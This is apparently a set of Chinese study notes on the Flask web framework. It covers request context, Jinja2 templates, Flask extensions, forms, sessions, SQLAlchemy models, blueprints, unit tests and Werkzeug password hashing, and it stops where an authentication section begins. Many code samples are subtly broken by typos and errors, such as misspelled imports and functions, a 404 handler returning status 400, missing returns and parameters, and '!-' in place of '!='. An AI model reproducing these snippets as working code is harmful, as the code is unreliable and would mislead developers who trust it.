请求-响应循环应用和请求上下文收到请求时flask需要访问一些对象才能完成对请求的处理，这时要像视图函数传入参数。为了避免传入不必要的参数，flask使用上下文临时把某些对象设置为全局可访问，例如request对象封装了用户发送的HTTP请求： 1234@app.route('/')def index(): user_agent = request.headers.get('User-Agent') return '&lt;p&gt;Your browser is {}&lt;/p&gt;'.format(user_agent) 上下文并不是全局变量，不同线程之间的访问是相互独立的。 Flask有请求上下文和应用上下文 变量 类型 说明 current_app 应用上下文 当前的应用实例 g 应用上下文 处理请求时用作临时存储的对象，每次请求都会重置这个对象 request 请求上下文 请求对象，封装了客户端发送的HTTP请求的内容 session 请求上下文 用户会话，一个字典 Flask 在分派请求之前激活上下文，请求处理完成后将其删除。获取上下文使用app.appcontext()方法。 请求分派收到请求后，Flask 会在app.url_map中寻找处理URL对应使用的函数， request对象封装收到的HTTP请求，含有以下常用属性和方法 1form, args, values, cookies, headers, get_data(), get_form(), blueprint,endpoint, method, scheme, is_secure(), host, path, Query_string, full_path, url, base_url, remote_addr, environ 请求钩子注册请求狗子在请求之前或者之后使用，通过装饰器实现，有四种。 before_request，每次请求之前运行 before_first_request，在第一个请求之前运行 after_request，无异常抛出时在请求之后运行 teardown_request，即使有异常抛出也会在请求之后执行 请求钩子和视图函数之间一般使用 g 对象共享数据。 response对象响应不但包括返回的字符串，还有请求头和HTTP状态码。Flask中有response对象可以处理返回的内容，包含以下常用属性和方法 1status_code, headers, set_cookie(), delete_cookie(), content_length, content_type, set_data(), get_data() redirect()函数专门用来生成重定向响应 123@app.route('/index.php')def indexphp(): redirect('/') abort()函数用于处理错误 1234@app.route('/user/&lt;name&gt;')def user(): if name != 'admin': abort(403) Flask 扩展Flask本身没有许多重要功能，比如数据库和身份验证，这些可以通过Flask扩展实现。 模板Jinja2 模板引擎渲染模板默认情况下，Flask在应用目录的 templates 文件夹下寻找模板 templates/index.html： 1&lt;h1&gt;Hello World!&lt;/h1&gt; templates/user.html： 1&lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt; hello.py： 123456789from flask import Flask, render_template@app.route('/')def index(): return render_template('index.html')@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name) 变量上面模板中使用的{{ name }}结构表示一个变量，这是一种特殊的占位符，告诉模板这个位置的值从渲染模板时提供的数据获取。Jinja2能识别许多类型的变量，包括一些复杂的变量，比如列表、字典和对象。 123&lt;p&gt; From a dictionary: {{ adict['key'] }} &lt;\\p&gt;&lt;p&gt; From a list, with a variable index: {{ alist[variableint] }} &lt;\\p&gt;&lt;p&gt; From an object's method: {{ aobj.amethod() }} &lt;\\p&gt; 变量的值可以用过滤器修改，形如 1{{ variable|filter }} 常用过滤器： 过滤器 说明 safe 渲染时不转义(XSS) captalize 首字母大写，其他小写 lower 全部转成小写 upper 全部转成大写||| title 每个单词开头的字母大写 trim 去掉首尾的空格 striptags 去掉HTML标签 控制结构Jinja2提供了控制结构改变渲染流程。 条件判断： 12345{% if user %} Hello, {{ user }}!{% else %} Hello, Stranger!{% endif %} 循环结构： 12345&lt;ul&gt; {% for comment in comments %} &lt;li&gt;{{ comment }}&lt;/li&gt; {% endfor %}&lt;/ul&gt; Jinja2还支持宏，类似于函数： 12345678{% macro render_comment(comment) %} &lt;li&gt;{{ comment }}&lt;/li&gt;{% endmacro %}&lt;ul&gt; {% for comment in comments %} {{ render_comment(comment) }} {% endfor %}&lt;/ul&gt; 宏可以单独放在一个文件中，以便重复使用 123456{% import 'macros.html' as macros %}&lt;ul&gt; {% for comment in comments %} {{ macros.render_comment(comment) }} {% endfor %}&lt;/ul&gt; 需要多次重复使用的模板代码片段也可以写到单独的文件中，再引入其他模板 1{% include 'common.html' %} Jinja2支持模板继承，类似于类继承。首先，创建一个base.html的基模板 1234567891011&lt;html&gt;&lt;head&gt; {% block head %} &lt;title&gt;{% block title %}{% endblock %} - My Application&lt;/title&gt; {% endblock %}&lt;/head&gt;&lt;body&gt; {% block body %} {% end block %}&lt;/body&gt;&lt;/html&gt; 基模板中定义的 block 可以在衍生模板中覆盖，本段定义了 head, title 和 body 区块，title包含在head中，衍生模板： 12345678{% extends 'base.html' %}{% block title %}Index{% endblock %}{% block head %} {{ super() }} &lt;style&gt;&lt;/style&gt;{% endblock %}{% block body %}{% endblock %} extends 表明要从 base.html继承，基模板中的block被重新定义，被子模板中同名区块的内容替代，子模板中可以使用 super()引用基模板的内容。 使用Flask-Bootstrap集成Bootstrap1pip install flask-bootstrap 123from flask_bootstrap import Bootstrap# ..bootstrap = Bootstrap(app) 初始化Bootstrap后，就可以使用包含Bootstrap文件的基模板，利用模板继承就可以使用。例如改写user.html： 1234567891011121314151617181920212223242526272829303132{% extends &quot;bootstrap/base.html&quot; %}{% block title %}Flasky{% endblock %}{% block navbar %}&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;navbar-collapse collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;{% endblock %}{% block content %}&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt;{% endblock %} bootstrap/base.html中定义了很多区块 区块 说明 doc 整个HTML文档 html_attribs &lt;html&gt;标签的属性 html &lt;html&gt;标签中的内容 head &lt;head&gt;标签的内容 title &lt;title&gt;标签的内容 meta 一组&lt;meta&gt;标签 styles CSS声明 body_attribs &lt;body&gt;标签的属性 body &lt;body&gt;标签的内容 navbar 用户定义的导航栏 content 用户定义的页面内容 scripts 文档底部的JavaScript声明 很多区块里都有Bootstrap的自用内容，如果直接覆盖会产生问题，需要使用 super函数 1234{% block scripts %}{{ super() }}&lt;script src='my.js'&gt;&lt;/script&gt;{% endblock %} 自定义错误界面Flask有errorhandler装饰器用于处理错误，错误页面可以由继承模板得到 1234567@app.errorhandler(404)def page_not_found(e): return render_template('404.html'),404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'),500 模板可以多重继承，将上面的user.html的content和title区块的内容删除，命名为base.html，404.html只需继承base.html并覆盖这两个区块的内容即可生成自定义的错误页面。 链接使用url_for()函数获得页面的链接，参数为视图函数名，动态URL需要传入关键字参数。例如：url_for(user, name='john', page=2, version=1)。 静态文件服务器默认从static文件夹下寻找所需要的静态文件，使用url_for('static', filename='css/style.css')获得链接。 12345{% block head %}{{ super() }}&lt;link rel=&quot;shortcunt icon&quot; href=&quot;{{ url+for('static', filename='favicon.ico') }}&quot; type=&quot;image/x-icon&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;{{ url_for('static', filename='favicon.ico') }}&quot; type=&quot;image/x-icon&quot;&gt;{% endblock %} 使用Flask-Moment本地化日期和时间服务器需要统一时间单位，一般使用UTC。不过用户需要的是当地的时间。Flask-moment是一个flask扩展，能简化把Moment.js集成到Jinja2模板的过程。pip install flask-moment。初始化Moment： 12from flask_moment import Momentmoment = Moment(app) Flask-Moment依赖jQuery.js和Moment.js，引入Moment.js： 1234{% block scripts %}{{ super() }}{{ moment.include_moment() }}{% endblock %} 添加一个datetime变量： 12345from datetime import datetime@app.route('/')def index(): return render_tempalate('index.html',currenttime=datetima.utcnow()) 渲染currenttime，templates/index.html： 12&lt;p&gt;The local date and time is {{ cureent_time.format('LLL') }}.&lt;/p&gt;&lt;p&gt;That was {{ moment(current_time.fromNow(refresh=True)) }}&lt;/p&gt; 这里的format('LLL')表示渲染的复杂度，从L到LLLL，还可以接受其他的格式说明符。fromNow渲染相对时间戳，会不断刷新。这个例子显示的是July 18, 2019 12:12 AM，a few seconds ago，随着时间变化还会变成a minute ago、two mimutes ago等等。可以使用locale本地化，例如 1{{ moments.locale('es') }} 表单Flask本身可以处理表单，但可以使用flask-wtf进行简化。pip install flask-wtf。 配置flask-wtf无需再应用层初始化，但需要配置密钥用于防止会话被篡改。 12app = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess' 为了增强安全性，密钥通常不写在源代码中，而是保存在环境变量中。 表单类使用Flask-wtf时，每个web表单都由一个继承自FlaskForm的类表示。这个类定义表单中的一组字段，每个字段都用对象来表示。字段对象可以附属一个或多个验证函数用于验证用户提交的数据是否有效。 一个例子，包含一个文本字段和提交按钮： 1234567from flask_wtf import FlaskFormfrom wtfroms import StringField, SubmitFieldfrom wtforms,validators import DataRequiredclass NameForm(FlaskForm): name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit') 这个表单中的字段定义为类变量，各个类变量的值时相对应字段类型的对象。这个例子中NameForm表单中有一个名为name的文本字段和一个名为submit的提交按钮。StringField类表示属性为type=”text”的HTML input元素。SubmitField类表示属性为type=”submit”的元素。字段构造函数的第一个参数是渲染HTML时使用的标注label。Validators指定一个由验证函数组成的列表，在用户提交数据之前进行验证。 渲染表单在视图函数中通过form参数把一个NameForm实例传入模板，就可以生成一个HTML表单，可以传入关键字参数添加指定的属性，hidden_tag为表单添加CSRF token。 12345&lt;form method=&quot;POST&quot;&gt; {{ form.hidden_tag() }} {{ form.name.label }}{{ form.name(id='namefiedl') }} {{ form.submit() }}&lt;/form&gt; 使用这样的方式渲染和美化表单工作量依然很大，所以应该尽量使用bootstrap的表单样式，上述表单可以用以下方式渲染，其中quick_form的参数为FlaskWTF表单对象： 12{% import &quot;bootstrap/wtf.html&quot; %}{{ wtf.quick_form(form) }} 一个完整示例（templates/index.html）： 12345678{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {% if name %}{{ name }}{% else %}Stranger{% endif %}&lt;/h1&gt;{{ wtf.quick_form(form) }}{% endblock %} 在视图函数中处理表单视图函数需要渲染表单并且收集表单中的用户提交的数据。 12345678@app.route('/', methods=['GET', 'POST'])def index(): name = None form = NameForm() if form.validate_on_submit(): name = form.name.data form.name.data = '' return render_template('index.html', form=form, name=name) 重定向和用户会话上个函数存在一个问题，输入名字并且提交表单后，刷新会收到浏览器的警告，是否重新提交数据。因为最后一个请求是POST，刷新后浏览器会重新发送请求。使用重定向作为POST请求的响应，浏览器会重新发送一个GET请求。 这个方法也有一个问题，用户已经提交了名字，然而一旦用户刷新，POST请求结束，用户提交的数据就不见了。因此应用需要保存输入的名字，这样重定向后的请求才能获得并使用这个名字。 应用把数据存储在用户会话中，用户会话是一种私有存储，每个连接到服务器的客户端都可以访问，属于请求上下文中的变量，名为session，像标准的Python字典一样操作。默认情况下，用户会话保存在客户端的cookie中，使用之前设置的密钥加密签名。 实现重定向和用户会话： 123456789from flask import Flask, render_template, session, redirect, url_for@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name')) 闪现消息请求完成后，有时需要让用户知道状态发生了改变，比如用户提交了错误的用户名或密码，服务器应该重新渲染表单，并且提示用户名或密码武侠，flash()函数提供这样的功能。 1234567891011from flask import Flask, render_template, session, redirect, rul_for, flash@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_sumit(): old_name = session.get('name') if old_name is not None and old_name != form.name.data: flash('Looks like you have changed your name') session['name'] = form.name.data return redirct(url_for('index')) return render_template('index.html', form = form, name = session.get('name')) 只在视图函数中调用flash()并不能显示信息，模板必须对它进行渲染，可以在基膜版中渲染使得所有页面都能显示闪现信息。Flask为模板提供get_flashed_messages()用于获取和渲染信息。 123456789{% block content %}&lt;div class=&quot;container&quot;&gt; {% for message in get_flashed_messages() %} &lt;div class=&quot;alert alert-warning&quot;&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;&amp;times;&lt;/buttion&gt; {{ message }}&lt;/div&gt;{% endfor %}{% block page_content %}{% endblock %} 数据库SQL数据库关系型数据库把数据存储在表中，表为实体建模。表中的列数是固定的，行数是可变的。 NoSQL数据库不符合以上关系模型的数据库统称为NoSQL数据库，一般使用集合代替表，使用文档代替记录。 Python数据库框架大多数数据库引擎提供对应的python包，如果无法满足需求，还有一些数据库抽象层代码包可选，例如 SQL Alchemy 和MongoEngine。 使用 Flask-SQLAlchemy管理数据Flask-SQLAlchemy是一个Flask扩展，简化了在Flask应用中使用SQLAlchemy的操作。pip install flask-sqlalchemy，数据库使用URL指定，几个例子： 数据库引擎 URL Mysql mysql://username:password@hostname/database Postgres postgresql://username:password@hostname/database SQLite(Linux, MacOS) sqlite:////absolute/path/to/database SQLite(Windows) sqlite:///c:/absolute/path/to/database 应用使用的数据库URL必须保存到Flask配置对象的SQLALCHEMY_DATABASE_URI键中。同时建议把SQLIALCHEMY_TRACK_MODIFICATIONS键设置为False，在不需要跟踪对象变化是降低内存消耗。初始化一个简单的SQLite数据库： 12345678import osfrom flask_sqlalchemy import SQLAlchemybasedir = os.path.absopath(os.path.dirname(__file__))app = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'data.sqlite')app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Falsedb = SQLAlchemy(app) db是SQLAlchemy类的实例，表示应用使用的数据库。 定义模型模型表示应用使用的持久化实体。ORM中，模型一般是一个python类，其中的属性对应于数据库表中的列。定义Role和User模型： 12345678910111213class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) def __repr__(self): return '&lt;Role %&gt;' % self.nameclass User(db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(64), unique=True, index=True) def __repr__(self): return '&lt;User %&gt;' % self.username Flask-SQLAlchemy要求每个模型都定义主键。 关系定义关系： 1234567class Role(db.Model): # ... users = db.relationship('User', backref='role')class User(db.Model): # ... role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) 数据库操作创建/删除表1234flask shellfrom hello import dbdb.drop_all()db.create_all() 插入行1234567from hello import Role, Useradmin_role = Role(name='Admin')mod_role = Role(name='Moderator')user_role = Role(name='User')user_john = User(username='john', role=admin_role)user_susan = User(username='susan', role=user_role)user_david = User(username='david', role=user_role) 模型的构造函数接受的参数是使用关键字参数指定的模型属性初始值。role属性也可以使用，这是一对多关系的高级表示。新建对象是没有明确设定id属性，大多数数据库的主键由数据库自身管理。目前这些对象只存在于python中，没有写入数据库，所以id为None。 对数据库的改动通过数据库会话管理，在Flask-SQLAlchemy中，会话由db.session表示，准备把对象写入数据库之前，要首先将其添加到会话中。 123456db.session.add(admin_role)db.session.add(mod_role)db.session.add(user_role)eb.session.add(user_john)db.session.add(user_susan)db.session.add(user_david) 或者可以简写为 1db.session.add_all([admin_role, mod_role, user_role, user_john, user_susan, user_david]) 为了把对象写入数据库，需要调用commit方法提交会话： 1db.session.commit() 数据库会话能保证数据的以执行，提交操作如果在写入会话的过程中发生了错误，整个会话都会失败，数据库会话也可以回滚，调用db.session.rollback()后，添加到数据库会话中的所有对象都将还原到它在数据库中的状态。 修改行在数据会话上调用add方法也能更新模型，把Admin角色重命名为Administrator： 123admin_role.name = 'Administrator'db.session.add(admin_role)db.session.commit 删除行12db.session.delete(mod_role)db.session.commit() 查询行Flask-Alchemy为每个模型类提供了query对象，最基本的模型查询使用all方法取回所有记录： 1234Role.query.all()# [&lt;Role 'Administrator'&gt;, &lt;Role 'User'&gt;]User.query.all()# [&lt;User 'john'&gt;, &lt;User 'susan'&gt;, &lt;User 'david'&gt;] 使用过滤器可以配置query对象以进行更精准的查询，查找角色为User的用户： 12User.query.filter_by(role=user_role).all()# [&lt;User 'susan'&gt;, &lt;User 'david'&gt;] 如果要查看SQLALlchemy为查询生成的SQL查询语句，只需要把query对象转换为字符串： 12str(User.query.filter_be(role=user_role))'SELECT users.id AS users_id, users.username AS users_username, users.role_id AS users_role_id \\nFROM Users \\nWHERE :param_1 = users.role_id' r如果推出了shell会话，前面这些例子中创建的对象不会以python对象的形式存在，但在数据库中仍有相应的行。可以从数据库读取行，重新创建Python对象，如加载名为User的user_role： 1user_role = Role.query.filter_by(name='User').first() first方法返回第一个结果，如果没有则返回None。 filter_by等过滤器在query对象上调用，返回一个过滤后的query对象。 关系与查询的处理方式类似，下面这个例子分别从关系的两端查询用户和角色的一对多关系 12345users = user_role.usersusers# [&lt;User 'susan'&gt;, &lt;User 'david'&gt;users[0].role# &lt;Role 'User'&gt; 有个小问题，执行user_role.user时会隐式调用all()方法，返回一个列表，此时query对象时隐藏的，无法指定过滤器。可以加入lazy='dynamic'参数，禁止自动查询。 1234class Role(db.Model): #... users = db.realationship('User', backref='role', lazy='dynamic') # ... 这样user.role.users会返回一个query对象，可以添加过滤器。 在视图函数中操作数据库前一节的数据库操作可以直接在视图函数中进行，把用户输入的名字记录到数据库中（hello.py）： 12345678910111213141516@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit() user = User.query.filter_by(username=form.name.data).first() if user is None: user = User(username=form.name.data) db.session.add(user) db.session.commit() session['known'] = False else: session['known'] = True session['name'] = form.name.data form.name.data = '' return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name'), known=session.get('known', False)) 为了正常运行，需要先在shell中创建数据库表。通过knowns可以对已知用户和新用户显示不同的内容（templates/index.html）： 1234567891011121314{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {% if name %}{{ name }}{% else %}Stranger{% endif %}&lt;/h1&gt; {% if not known %} &lt;p&gt;Pleased to meet you!&lt;/p&gt; {% else %} &lt;p&gt;Happy to see you again!&lt;/p&gt; {% endif %}&lt;/div&gt;{{ wtf.quick_form(form) }}{% endblock %} 集成python shell每次启动会话都要导入数据库实例和模型，可以通过配置让flask shell命令自动导入这些对象。若想把对象添加到导入列表，必须使用app.shell_context_processor装饰器创建并注册一个shell上下文管理器： 123@app.shell_context_processordef make_shell_context(): return dict(db=db, User=User, Role=Role) 这个shell上下文处理器函数返回一个字典，包含数据库实例和模型，除了默认导入的app以外，flask shell命令将自动吧这些对象导入shell。 使用Flask-Migrate实现数据库迁移开发过程中，有时需要修改数据库模型，而且修改之后要更新数据库。当数据库表不存在时，Flask-SQLAlchemy才会根据模型创建。因此，更新表需要删除旧表，但是会丢失所有数据。 更好的方法是使用数据库迁移框架，它可以追踪数据库模式的变化，然后以增量方式把变化应用到数据库中。SQLAlchemy开发人员编写了一个迁移框架名为Alembic，Flask由Flask-Migrate扩展。 创建迁移仓库先安装Flask-Migrate，pip install flask-migrate 初始化： 1234from flask_migrate import Migrate# ...migrate = Migrate(app.db) Flask-Migrate添加了 flask db命令和几个子命令，新项目中可以使用init子命令添加迁移支持 1flask db init 这会创建 migrations 目录，所有迁移脚本存放在这里。 电子邮件Flask-Mail插件提供电子邮件支持，需要时查阅。 大型应用的结构Flask 并不强制开发者使用特定方式组织大型应用，以下介绍一种用包和模块组织大型应用的方式。 项目结构1234567891011121314151617181920|-flasky/ |-app/ |-templates/ |-static/ |-main/ |-__init__.py |-errors.py |-forms.py |-views.py |-__init__.py |-email.py |-models.py |-migrations/ |-tests/ |-__init__.py |-test*.py |-venv/ |-requirements.txt |-config.py |-flasky.py 说明： app/ 保存Flask 应用 migrations/ 保存数据库迁移脚本 test/ 单元测试 venv/ Python虚拟环境 requirements.txt 列出所有依赖包，便于在其他计算机中重新生成i昂同的虚拟环境 config.py 存储配置 flasky.py 定义Flask应用实例，辅助管理应用 配置选项除去之前 hello.py 中类似字典的 app.config对象之外，可以使用具有层次结构的配置类。config.py： 1234567891011121314151617181920212223242526272829303132333435363738394041import osbasedir = os.path.abspath(os.path.dirname(__file__))class Config: SECRET_KEY = os.environ.get('SECRET_KEY') or 'hard to guess string' MAIL_SERVER = os.environ.get('MAIL_SERVER', 'smtp.googlemail.com') MAIL_PORT = int(os.environ.get('MAIL_PORT', '587')) MAIL_USE_TLE = os.environ.get('MAIL_USE_TLS', 'tls').lower() in ['true', 'on', '1'] MAIL_USERNAME = os.environ.get('MAIL_USERNAME') MAIL_PASSWORD = os.environ.get('MAIL_PASSWORD') FLASKY_MAIL_SUBJECT_PREFIX = '[flasky]' FLASKY_MAIL_SENDER = 'Flasky Admin &lt;flasky@example.com&gt;' FLASKY_ADMIN = os.environ.get('FLASKY_ADMIN') SQLALCHEMY_TRACK_MODIFICATIONS = False @staticmethod def init_app(app): passclass DevelpmentConfig(Config): DEBUG = True SQLALCHEMY_DATABASE_URI = os.environ.get('DEV_DATABASE_URL') or 'sqlite:///' + os.path.join(basedir, 'data-dev.sqlite')class TestingConfig(Config): TESTING = True SQLALCHEMY_DATABASE_URI = os.environ.get('TEST_DAATABASE_URL') or 'sqlite://'class ProductionConfig(Config): SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URI') or 'sqlite://' + os.path.join(basedir, 'data.sqlite')config = { 'development': DevelopmentConfig, 'tessting': TestingConfig, 'production': ProductionConfig, 'default': DeevelopmentConfig} 基类Config 包含通用配置，各个子类分别定义专用的配置。为了灵活和安全，多数配置都可以从环境变量中导入。千万不能把敏感信息写在纳入版本控制系统的配置文件中。Config及其子类可以定义 init_app()方法，其参数为应用实例。 应用包应用包用于夫南方应用的所有代码，模板和静态文件，我们可以直接把这个包成为 app，也可以使用一个专属名称。templates 和 static 目录现在是应用包的一部分，数据库模型和电子邮件支持函数也要放到这个包中。 使用应用工厂函数在单个文件开发应用有个很大的缺点：应用在全局作用域中创建，无法动态修改配置。解决办法是延迟创建实例，把创建过程移到可显式调用的 工厂函数中。不仅可以给脚本留出配置应用的时间，还能够创建多个应用实例，方便测试。工厂函数在 app 包的构造文件中定义。app/__init__.py： 12345678910111213141516171819202122232425from flask import Flask, render_templatefrom flask_botstrap import Bootstrapfrom flask_mail import Mailfrom flask_moment import Momentfrom flassk_sqlalchemy import SQLAlchemyfrom config import configbootstrap = Bootstrap()mail = Mail()moment = Moment()db = SQLAlchemy()def create_app(config_name): app = Flask(__name__) app.config.from_object(config[onfig_name]) config[config_name].init_app(app) bootstrap.init_app(app) mail.init__app(app) moment.init_app(app) db.init_app(app) # 添加路由和自定义错误页面 return app 构造文件导入了大多数正在使用的Flask扩展，由于尚未初始化所需的应用实例，所以创建扩展类时没有向构造函数传入参数，因此扩展并未初始化。create_app()时应用的工厂函数，接受一个参数，应用使用的配置名。配置类在 config.py 中定义。其中定义的配置可以使用app.config提供的from_object 方法直接导入应用。应用创建并且配置完成后就可以初始化扩展，在之前创建的对象上调用init_app()完成初始化，可以实现更复杂的初始化。 这个工厂函数创建的应用还不完整，因为没有路由和自定义的错误页面处理程序。 在蓝本中实现应用功能转换成工厂函数让定义路由变得复杂了。在单脚本应用中，应用实例存在于全局变量作用域，路由可以直接使用app.route装饰器定义。但现在应用在运行时创建，只有调用 create_app 之后才能使用 app.route 装饰器，这是定义路由就太晚了。自定义的错误页面同理。 Flask使用蓝本 blueprint 提供了解决办法。蓝本与应用类似，可以定义路由和错误处理程序，不同的是，蓝本中定义的路由和错误处理程序处于休眠状态，知道蓝本注册到应用上之后，他们才真正成为应用的一部分。使用位于全局作用域中的蓝本时，定义路由和错误处理程序的方法几乎与但脚本应用一样。 蓝本可以在单个文件中定义，也可以使用更结构化的方式在包中的多个模块中创建。为了获得灵活性，我们在应用包中创建一个子包，用于保存应用的第一个蓝本。app/main/__init__.py： 12345from flask import Bluprintmain = Blueprint('main', __name__)from . import views, errors 蓝本通过实例化一个Blueprint类对象，这个构造函数有两个必须指定的参数，蓝本名称和蓝本所在的包或模块。与应用一样，第二个参数一般使用__name__。 应用的路由保存在在 app/main/views.py 中，错误处理保存在 app/main/errors.py 中，导入这两个模块就能把路由和错误处理程序与蓝本关联起来。导入在末尾进行时为了防止循环导入依赖，因为在 view 和 errors 中还要导入 main 蓝本。 蓝本在工厂函数create_app()中注册到应用上，app/__init__.py： 12345def create_app(config_name): from .main import main as main_blueprint app.register_blueprint(main_blueprint) return app 错误处理程序，app/main/errors.py： 12345678910from flask import render_templatefrom . import main@main.app_errorhandler(404): def page_not_found(e): return render_template('404.html'),400 @main.app_errorhandler(500): def internal_server_error(e): return render_template('500.html'),500 在蓝本中编写错误处理程序稍有不同，如果使用errorhandler装饰器，则只有蓝本中的错误才能触发，要想注册应用全局的错误处理程序，必须使用 app_errorhandler装饰器。 在蓝本中定义路由，app/main/views.py： 1234567891011121314from datetime import datetimefrom flask import render_template, session, redirect, url_forfrom . impot mainfrom .forms import NameFromfrom .. import dbfrom ..models import User@main.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): # ... return redirect(url_for('main.index')) return render_template('index.html', form=form, message=session.get('name'), known=session.get('known', False), current_time=datetime.utcnow()) 在脚本中编写视图函数主要有两点不同：第一，与前面的错误处理程序一样，路由装饰器由蓝本提供，因此使用的是main.route，而非app.route；第二，url_for 函数的用法不同，在蓝本中，Flask会为所有蓝本中的端点加上一个命名空间，这样就可以在不同的蓝本中使用相同的端点名定义视图函数而不产生冲突。命名空间是蓝本的名称，即 Blueprint 构造函数的第一个参数，而且它与端点名之间以一个 . 分割。因此视图函数 index 注册的端点名为 main.index, url使用 url_for('main.index')获取。蓝本中，url_for可以使用省略形式，省略蓝本名，url_for('.index')。 需要引入表单对象，保存在app/main/forms.py。 应用脚本应用实例在顶级目录的 flasky.py 中定义。flasky.py： 1234567891011import osfrom app import create_app, dbfrom app.modules import User, Rolefrom flask_migrate import Migrateapp = create_app(os.getenv('FLASK_CONFIG') or 'defalt')migrate = Migrate(app, db)@app.shell_context_processordef make_shell_context(): return dict(db=db, User=User, Role=Role) 这个脚本创建应用实例，读取环境变量，初始化 Flask-Migrate 为Python shell 定义上下文。 设置环境变量： 12export FLASK_APP=flasky.pyexport FLASK_DEBUG=1 需求文件requirements.txt文件用于记录所有依赖包及其版本号，可以在另一台计算机上重新恒诚虚拟环境。 生成：pip freeze &gt; requirements.txt 还原：pip install -r requiirements.txt 单元测试简单的两个测试，tests/test_basics.py： 123456789101112131415161718192021import unittestfrom flask import current_appfrom app import create_app, dbclass BasicsTestCase(unittest.Testcase): def setUb(self): self.app = create_app('testing') self.app_context = self.app.app_context self.app_context.push() db.create_all() def tearDown(self): db.session.remove() db.drop_all() self.app_context.pop() def test_app_exitsts(self): self.assertFalse(current_app is None) def test_app_is_testing(self): self.assertTure(current_app.config['TESTING']) 使用 unittest 包编写，测试用例类的 setUp 和 tearDown 方法分别在各测试之前和之后运行，名称以test_开头的方法都作为测试运行。 setUp方法尝试创建一个测试环境，尽量与正常运行应用所需的环境已知。首先使用测试配置创建应用，然后激活上下文，保证在测试中能够使用 current_app，然后使用create_all创建一个全新的数据库库，数据库和应用上下文在 tearDown中删除。第一个测试确保应用实例存在，第二个确保应用在测试环境中运行。 为了执行单元测试，可以在flasky.py中添加一个自定义命令。flasky.py 123456@app.cli.command()def test(): &quot;&quot;&quot;Run unit tests.&quot;&quot;&quot; import unittest tests = unittest.TestLoader().discover('tests') unittest.TextTestRunner(verbosity=2).run(tests) app.cli.command装饰器把被装饰的函数名当作命令，调用 unittest包中提供的测试运行程序。使用flask test运行。 创建数据库运行应用实例：社交博客应用用户身份认证Flask 有很多身份验证包，这里的方案使用了多个包，通过编写胶水代码让不同的包写作。使用的包：Flask-Login 管理以登录用户的用户会话；Werkzeug 计算密码散列值并进行核对；itsdangerous 生成并核对加密安全令牌。 除了身份验证外，还将用到的扩展：Flask-Mai；Flask-Bootstrap；Flask-WTF。 密码安全性使用Werkzeug计算密码散列值Werkzeug 中的security模块实现了密码散列值的计算，这一功能的实现只需要两个函数，分别在注册和核对两个阶段。generate_password_hash(password, method='pbkdf2:sha256', salt_length=8)，这个函数的输入为原始密码，返回散列的字符串形式供存入数据库。method和salt_length多数情况下可以使用默认值。check_password_hash(hash, password)这个函数的参数是从数据库取回的密码散列值和用户输入的密码，返回True时表示密码正确。 在之前创建的User模型基础上加入密码散列的改动，app/models.py： 12345678910111213141516from werkzeug.security import generate_password_hash, check_password_hashclass User(db.Model): # ... password_hash = db.Column(db.String(128)) @property def password(self): raise AttributeError('password is not a readable attribute') @password.setter def password(self, password): self.password_hash = generate_password_hash(password) def verify_password(self, password): return check_password_hash(self.password_hash, password) 添加单元测试，测试最近的改动。test/test_user_model.py： 12345678910111213141516171819import unittestfrom app.models import Userclass UserModelTestCase(unittest.TestCase): def test_password_setter(self): u = User(password = 'cat') self.assertTrue(u.password_hash is not None) def test_no_password_getter(self): u = User(password = 'cat') with self.assertRaises(AtrributeError): u.password def test_password_verification(self): u = User(password = 'cat') self.assertTrue(u.verify_password('cat')) self.assertFalse(u.verify_password('dog')) def test_password_aslts_are_random(self): u = User(password='cat') u2 = User(password='cat') self.assertTrue(u.password_hash !- u2.password_hash) 创建身份验证蓝本使用一个名为 auth 